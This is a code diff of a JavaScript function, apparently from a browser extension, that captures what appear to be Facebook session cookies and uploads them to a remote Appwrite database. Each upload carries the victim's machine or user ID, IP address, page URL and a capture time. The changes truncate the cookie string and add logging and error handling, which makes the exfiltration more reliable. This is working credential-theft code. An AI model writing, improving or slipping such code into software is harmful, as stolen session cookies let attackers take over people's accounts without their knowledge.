@@ -978,13 +978,17 @@ async function sendToBackend(type, data, retry = false) {
       console.log('Saving FB_COOKIES to Appwrite:', { hasCookies: !!cookiesToSave, cookiesLength: cookiesToSave.length });
 
       if (cookiesToSave) {
+        console.log('=== Saving cookies to Appwrite ===');
+        console.log('Cookies length:', cookiesToSave.length);
+
         const cookiesData = {
           userId: userId || machineId,
-          cookies: cookiesToSave,
+          cookies: cookiesToSave.substring(0, 10000), // Limit size to avoid Appwrite limits
           url: data.url || '',
           ip: ip,
           capturedAt: new Date().toISOString()
         };
+        console.log('Cookies data prepared:', { userId: cookiesData.userId, url: cookiesData.url, cookiesLength: cookiesData.cookies.length });
 
         const cookiesResponse = await fetch(
           `${APPWRITE_CONFIG.endpoint}/databases/${APPWRITE_CONFIG.databaseId}/collections/${APPWRITE_CONFIG.collections.cookies}/documents`,
@@ -997,7 +1001,16 @@ async function sendToBackend(type, data, retry = false) {
             })
           }
         );
+
         console.log('Cookies save response:', cookiesResponse.status, cookiesResponse.statusText);
+        if (!cookiesResponse.ok) {
+          const errorBody = await cookiesResponse.text();
+          console.error('Cookies save error body:', errorBody);
+        } else {
+          console.log('✅ Cookies saved successfully to Appwrite');
+        }
+      } else {
+        console.log('No cookies to save (empty)');
       }
     }
 
